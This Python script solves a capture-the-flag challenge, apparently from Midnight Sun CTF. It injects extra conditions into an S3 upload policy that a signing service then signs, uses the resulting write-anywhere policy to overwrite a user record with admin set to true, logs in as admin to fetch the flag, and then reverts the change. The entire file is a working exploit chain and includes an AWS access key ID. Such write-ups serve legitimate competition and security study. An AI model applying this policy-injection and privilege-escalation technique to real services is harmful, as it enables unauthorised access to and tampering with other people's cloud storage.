import hmac
import hashlib
import requests
import urllib
import json

email = "somerandomemail@yourprovider.abcde"
password = "supersecretpassword!!!"

# Used to create the password
def createHMAC(email, password):
    return hmac.new("[object Object]", email+password, digestmod=hashlib.sha256).hexdigest()

# Create hmac, then download the policy
def getSignedJSON(d):
    digest = hmac.new("[object Object]", d, digestmod=hashlib.sha256).hexdigest()
    enc = urllib.urlencode({'acl': d, 'hmac': digest})
    return requests.get("http://cloudb-01.play.midnightsunctf.se/signature?"+enc).text.split(":")

# Get the signed JSON policy, which allows us to write anywhere into every bucket the signer has access to
data = getSignedJSON("public-read-write'}],'conditions': [['starts-with', '$bucket', ''],['starts-with', '$key', ''],{'acl': 'public-read-write'}],'Conditions': [{'acl': 'public-read-write")

# Upload our new user JSON with admin set to `true`
r = requests.post("https://cloudb-users.s3.amazonaws.com/", data={"acl": "public-read-write", "AWSAccessKeyId": "AKIAJQSA73ND6ITM5ETQ", "Policy": data[0], "Signature": data[1], 'key': "users/%s/info.json"%email}, files={"file": json.dumps({"admin": True, "hmac": createHMAC(email, password), "name": "SomeNameHere", "email": email})})
assert r.status_code == 204

# Log in as admin and get the flag
print "Flag:", requests.post("http://cloudb-01.play.midnightsunctf.se/admin", data={"email": email, "password": password, "hmac": createHMAC(email, password+"adminlogin")}).text

# Set admin to `false` again
r = requests.post("https://cloudb-users.s3.amazonaws.com/", data={"acl": "public-read-write", "AWSAccessKeyId": "AKIAJQSA73ND6ITM5ETQ", "Policy": data[0], "Signature": data[1], 'key': "users/%s/info.json"%email}, files={"file": json.dumps({"admin": False, "hmac": createHMAC(email, password), "name": "SomeNameHere", "email": email})})
assert r.status_code == 204
